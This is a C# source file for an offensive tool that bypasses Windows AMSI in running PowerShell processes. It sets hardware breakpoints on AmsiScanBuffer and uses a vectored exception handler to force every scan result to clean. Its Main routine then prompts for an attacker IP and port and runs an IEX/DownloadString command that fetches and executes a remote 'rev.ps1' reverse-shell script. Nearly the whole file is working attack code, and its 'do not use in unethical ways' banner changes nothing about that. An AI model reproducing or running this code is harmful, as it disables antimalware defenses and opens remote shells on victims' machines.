﻿using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Reflection;
using System.Threading;

namespace HBFullBypass
{
    public class HBFullBypass
    {
        public const UInt32 EXCEPTION_CONTINUE_EXECUTION = 0xFFFFFFFF;
        public const UInt32 EXCEPTION_CONTINUE_SEARCH = 0;
        public const UInt32 EXCEPTION_SINGLE_STEP = 0x80000004;
        public const Int32 AMSI_RESULT_CLEAN = 0;

        private static readonly object breakpointLock = new object();

        [Flags]
        public enum CONTEXT64_FLAGS : uint
        {
            CONTEXT64_AMD64 = 0x100000,
            CONTEXT64_CONTROL = CONTEXT64_AMD64 | 0x01,
            CONTEXT64_INTEGER = CONTEXT64_AMD64 | 0x02,
            CONTEXT64_DEBUG_REGISTERS = CONTEXT64_AMD64 | 0x10,
            CONTEXT64_ALL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_DEBUG_REGISTERS
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct M128A
        {
            public ulong High;
            public long Low;

            public override string ToString()
            {
                return string.Format("High:{0}, Low:{1}", this.High, this.Low);
            }
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct XSAVE_FORMAT64
        {
            public ushort ControlWord;
            public ushort StatusWord;
            public byte TagWord;
            public byte Reserved1;
            public ushort ErrorOpcode;
            public uint ErrorOffset;
            public ushort ErrorSelector;
            public ushort Reserved2;
            public uint DataOffset;
            public ushort DataSelector;
            public ushort Reserved3;
            public uint MxCsr;
            public uint MxCsr_Mask;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public M128A[] FloatRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] XmmRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT64
        {
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;

            public CONTEXT64_FLAGS ContextFlags;
            public uint MxCsr;

            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;

            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;

            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;
            public ulong Rip;

            public XSAVE_FORMAT64 DUMMYUNIONNAME;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
            public M128A[] VectorRegister;
            public ulong VectorControl;

            public ulong DebugControl;
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct EXCEPTION_RECORD
        {
            public uint ExceptionCode;
            public uint ExceptionFlags;
            public IntPtr ExceptionRecord;
            public IntPtr ExceptionAddress;
            public uint NumberParameters;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 15)]
            public uint[] ExceptionInformation;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct EXCEPTION_POINTERS
        {
            public IntPtr pExceptionRecord;
            public IntPtr pContextRecord;
        }

        struct OBJECT_ATTRIBUTES
        {
            public int Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        [DllImport("ntdll.dll", SetLastError = true)] static extern UInt32 NtOpenProcess(ref IntPtr ProcessHandle, UInt32 AccessMask, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID ClientId);
        [DllImport("ntdll.dll", SetLastError = true)] static extern UInt32 NtGetContextThread(IntPtr hThread, IntPtr lpContext);
        [DllImport("ntdll.dll", SetLastError = true)] static extern UInt32 NtSetContextThread(IntPtr hThread, IntPtr lpContext);
        [DllImport("ntdll.dll", SetLastError = true)] public static extern IntPtr RtlAddVectoredExceptionHandler(uint First, IntPtr Handler);
        [DllImport("ntdll.dll", SetLastError = true)] public static extern UInt32 RtlRemoveVectoredExceptionHandler(IntPtr Handle);
        [DllImport("ntdll.dll", SetLastError = true)] static extern UInt32 NtCreateThreadEx(ref IntPtr threadHandle, UInt32 desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool inCreateSuspended, int stackZeroBits, int sizeOfStack, int maximumStackSize, IntPtr attributeList);
        [DllImport("ntdll.dll", SetLastError = true)] static extern uint NtResumeThread(IntPtr ThreadHandle, out uint SuspendCount);
        [DllImport("ntdll.dll", SetLastError = true)] static extern UInt32 NtClose(IntPtr Handle);
        [DllImport("ntdll.dll", SetLastError = true)] static extern UInt32 NtOpenThread(ref IntPtr ThreadHandle, UInt32 DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID ClientId);
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)] static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);
        [DllImport("kernel32.dll", SetLastError = true)] static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        private static bool IsAmsiBypassed(Process process, ref int bypassedCount, int totalProcesses, IntPtr amsiScanBuffer, out IntPtr hThread)
        {
            hThread = IntPtr.Zero;
            IntPtr hProcess = IntPtr.Zero;
            OBJECT_ATTRIBUTES objAttr = new OBJECT_ATTRIBUTES();
            CLIENT_ID clientId = new CLIENT_ID { UniqueProcess = (IntPtr)process.Id };

            if (NtOpenProcess(ref hProcess, 0x001FFFFF, ref objAttr, ref clientId) != 0)
            {
                Console.WriteLine("[-] Failed to open process: " + process.Id);
                return false;
            }

            try
            {
                IntPtr amsiBase = LoadLibrary("amsi.dll");
                if (amsiBase == IntPtr.Zero)
                {
                    Console.WriteLine("[+] AMSI bypassed: amsi.dll not loaded in PID: " + process.Id);
                    bypassedCount++;
                    return true;
                }

                if (amsiScanBuffer == IntPtr.Zero)
                {
                    Console.WriteLine("[+] AMSI bypassed: AmsiScanBuffer not found in PID: " + process.Id);
                    bypassedCount++;
                    return true;
                }

                bool hasHardwareBreakpoint = false;
                foreach (ProcessThread thread in process.Threads)
                {
                    IntPtr hThreadToCheck = IntPtr.Zero;
                    clientId.UniqueThread = (IntPtr)thread.Id;
                    if (NtOpenThread(ref hThreadToCheck, 0x001F03FF, ref objAttr, ref clientId) != 0)
                    {
                        Console.WriteLine(String.Format("[-] Failed to open thread {0} for context check in process: {1}", thread.Id, process.Id));
                        continue;
                    }

                    try
                    {
                        IntPtr pCtx = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(CONTEXT64)));
                        try
                        {
                            CONTEXT64 ctx = new CONTEXT64 { ContextFlags = CONTEXT64_FLAGS.CONTEXT64_DEBUG_REGISTERS };
                            Marshal.StructureToPtr(ctx, pCtx, false);
                            if (NtGetContextThread(hThreadToCheck, pCtx) != 0)
                            {
                                continue;
                            }

                            ctx = (CONTEXT64)Marshal.PtrToStructure(pCtx, typeof(CONTEXT64));
                            if ((ctx.Dr7 & 0x1) == 0x1 && ctx.Dr0 == (ulong)amsiScanBuffer.ToInt64())
                            {
                                hasHardwareBreakpoint = true;
                                break;
                            }
                        }
                        finally
                        {
                            Marshal.FreeHGlobal(pCtx);
                        }
                    }
                    finally
                    {
                        NtClose(hThreadToCheck);
                    }
                }

                if (NtCreateThreadEx(ref hThread, 0x1F03FF, IntPtr.Zero, hProcess, amsiScanBuffer, IntPtr.Zero, true, 0, 0, 0, IntPtr.Zero) != 0)
                {
                    Console.WriteLine("[-] Failed to create temporary thread in process: " + process.Id);
                    return false;
                }

                if (hasHardwareBreakpoint)
                {
                    Console.WriteLine("[+] AMSI bypassed: Hardware breakpoint already set in PID: " + process.Id);
                    bypassedCount++;
                    return true;
                }

                Console.WriteLine("[+] AMSI intact in PID: " + process.Id);
                return false;
            }
            finally
            {
                if (hThread == IntPtr.Zero)
                    NtClose(hProcess);
            }
        }

        public static bool SetupHardwareBreakpoint(IntPtr hThread, IntPtr amsiScanBuffer)
        {
            lock (breakpointLock)
            {
                IntPtr pCtx = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(CONTEXT64)));
                try
                {
                    CONTEXT64 ctx = new CONTEXT64 { ContextFlags = CONTEXT64_FLAGS.CONTEXT64_ALL };
                    Marshal.StructureToPtr(ctx, pCtx, false);
                    if (NtGetContextThread(hThread, pCtx) != 0)
                    {
                        Console.WriteLine("[-] Failed to get thread context");
                        return false;
                    }

                    ctx = (CONTEXT64)Marshal.PtrToStructure(pCtx, typeof(CONTEXT64));
                    Console.WriteLine(String.Format("[+] Pre-hijack DR0: 0x{0:X}, DR7: 0x{1:X}", ctx.Dr0, ctx.Dr7));

                    if (ctx.Dr7 != 0)
                    {
                        Console.WriteLine("[!] Debug registers in use; skipping thread");
                        return false;
                    }

                    ctx.Dr0 = (ulong)amsiScanBuffer.ToInt64();
                    ctx.Dr7 = 0x1;
                    Marshal.StructureToPtr(ctx, pCtx, true);

                    if (NtSetContextThread(hThread, pCtx) != 0)
                    {
                        Console.WriteLine("[-] Failed to set thread context");
                        return false;
                    }

                    if (NtGetContextThread(hThread, pCtx) != 0)
                    {
                        Console.WriteLine("[-] Failed to verify thread context");
                        return false;
                    }
                    ctx = (CONTEXT64)Marshal.PtrToStructure(pCtx, typeof(CONTEXT64));
                    Console.WriteLine(String.Format("[+] Post-hijack DR0: 0x{0:X}, DR7: 0x{1:X}", ctx.Dr0, ctx.Dr7));

                    if (ctx.Dr0 != (ulong)amsiScanBuffer.ToInt64() || ctx.Dr7 != 0x1)
                    {
                        Console.WriteLine("[-] Hardware breakpoint not set correctly");
                        return false;
                    }

                    Console.WriteLine("[+] Hardware breakpoint set successfully");
                    return true;
                }
                finally
                {
                    Marshal.FreeHGlobal(pCtx);
                }
            }
        }

        public static IntPtr RegisterExceptionHandler()
        {
            var method = typeof(HBFullBypass).GetMethod(nameof(ExceptionHandler), BindingFlags.Static | BindingFlags.NonPublic);
            IntPtr handler = method.MethodHandle.GetFunctionPointer();
            IntPtr handlerPtr = RtlAddVectoredExceptionHandler(1, handler);
            Console.WriteLine(handlerPtr != IntPtr.Zero ? "[+] Exception handler registered" : "[-] Failed to register exception handler");
            return handlerPtr;
        }

        private static long ExceptionHandler(IntPtr exceptions)
        {
            EXCEPTION_POINTERS ep = (EXCEPTION_POINTERS)Marshal.PtrToStructure(exceptions, typeof(EXCEPTION_POINTERS));
            EXCEPTION_RECORD er = (EXCEPTION_RECORD)Marshal.PtrToStructure(ep.pExceptionRecord, typeof(EXCEPTION_RECORD));
            CONTEXT64 ctx = (CONTEXT64)Marshal.PtrToStructure(ep.pContextRecord, typeof(CONTEXT64));

            if (er.ExceptionCode == EXCEPTION_SINGLE_STEP && ctx.Dr0 == (ulong)er.ExceptionAddress.ToInt64())
            {
                Console.WriteLine("[+] Single-step exception triggered");
                IntPtr scanResult = Marshal.ReadIntPtr((IntPtr)(ctx.Rsp + (6 * 8)));
                Marshal.WriteInt32(scanResult, AMSI_RESULT_CLEAN);
                Console.WriteLine("[+] AMSI scan bypassed");

                ctx.Rip = (ulong)Marshal.ReadInt64((IntPtr)ctx.Rsp);
                ctx.Rsp += 8;
                ctx.Rax = 0;
                ctx.Dr0 = 0;
                ctx.Dr7 = 0;
                Marshal.StructureToPtr(ctx, ep.pContextRecord, true);
                return EXCEPTION_CONTINUE_EXECUTION;
            }
            return EXCEPTION_CONTINUE_SEARCH;
        }

        public static int SetupBypass()
        {
            Console.WriteLine("[*] Author: Noel Frey\n[*] Inspired by Sh3lld0n and S3cur3Th1sSh1t\n[*] Github: github.com/NoelFrey\n[!] Please do not use in unethical ways [!]");

            Process[] processes = Process.GetProcessesByName("powershell");
            if (processes.Length == 0)
            {
                Console.WriteLine("[-] No PowerShell process found");
                return -1;
            }

            IntPtr amsiBase = LoadLibrary("amsi.dll");
            if (amsiBase == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to load amsi.dll");
                return -1;
            }

            IntPtr amsiScanBuffer = GetProcAddress(amsiBase, "AmsiScanBuffer");
            if (amsiScanBuffer == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to find AmsiScanBuffer");
                return -1;
            }

            int bypassedCount = 0;
            IntPtr exceptionHandler = IntPtr.Zero;

            foreach (Process process in processes)
            {
                Console.WriteLine(String.Format("\n[+] Targeting PowerShell PID: {0}", process.Id));
                IntPtr hThread;
                if (IsAmsiBypassed(process, ref bypassedCount, processes.Length, amsiScanBuffer, out hThread))
                {
                    Console.WriteLine("[+] Skipping - AMSI already bypassed");
                    NtClose(hThread);
                    continue;
                }

                IntPtr hProcess = IntPtr.Zero;
                OBJECT_ATTRIBUTES objAttr = new OBJECT_ATTRIBUTES();
                CLIENT_ID clientId = new CLIENT_ID { UniqueProcess = (IntPtr)process.Id };

                if (NtOpenProcess(ref hProcess, 0x001FFFFF, ref objAttr, ref clientId) != 0)
                {
                    Console.WriteLine("[-] Failed to open process: " + process.Id);
                    NtClose(hThread);
                    continue;
                }

                try
                {
                    if (exceptionHandler == IntPtr.Zero)
                    {
                        exceptionHandler = RegisterExceptionHandler();
                        if (exceptionHandler == IntPtr.Zero)
                        {
                            NtClose(hThread);
                            continue;
                        }
                    }

                    bool breakpointSet = false;
                    foreach (ProcessThread thread in process.Threads)
                    {
                        IntPtr hThreadToSet = IntPtr.Zero;
                        clientId.UniqueThread = (IntPtr)thread.Id;
                        if (NtOpenThread(ref hThreadToSet, 0x001F03FF, ref objAttr, ref clientId) != 0)
                        {
                            continue;
                        }

                        try
                        {
                            if (SetupHardwareBreakpoint(hThreadToSet, amsiScanBuffer))
                            {
                                breakpointSet = true;
                                Console.WriteLine(String.Format("[+] Breakpoint set on thread {0}", thread.Id));
                                break;
                            }
                        }
                        finally
                        {
                            NtClose(hThreadToSet);
                        }
                    }

                    if (breakpointSet)
                    {
                        uint suspendCount;
                        if (NtResumeThread(hThread, out suspendCount) == 0)
                            Console.WriteLine("[+] AMSI bypass complete for PID: " + process.Id);
                        else
                            Console.WriteLine("[-] Failed to resume thread");
                    }
                    else
                    {
                        Console.WriteLine("[-] Failed to set any breakpoints");
                    }

                    NtClose(hThread);
                }
                finally
                {
                    NtClose(hProcess);
                }
            }

            if (exceptionHandler != IntPtr.Zero)
            {
                RtlRemoveVectoredExceptionHandler(exceptionHandler);
                Console.WriteLine("[+] Exception handler removed");
            }

            Console.WriteLine(String.Format("[*] Summary: {0} of {1} processes already bypassed", bypassedCount, processes.Length));
            return processes.Length > 0 ? 0 : -1;
        }

        public static void Main()
        {
            SetupBypass();

            Console.Write("[*] Attacker IP: ");
            string ip = Console.ReadLine();

            Console.Write("[*] Attacker WebServer PORT: ");
            string port = Console.ReadLine();

            string revShellcommand = @"IEX (New-Object System.Net.WebClient).DownloadString('http://IP:PORT/rev.ps1')";
            revShellcommand = revShellcommand.Replace("IP", ip).Replace("PORT", port);

            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(revShellcommand);
            ps.Invoke();
            rs.Close();
        }
    }
}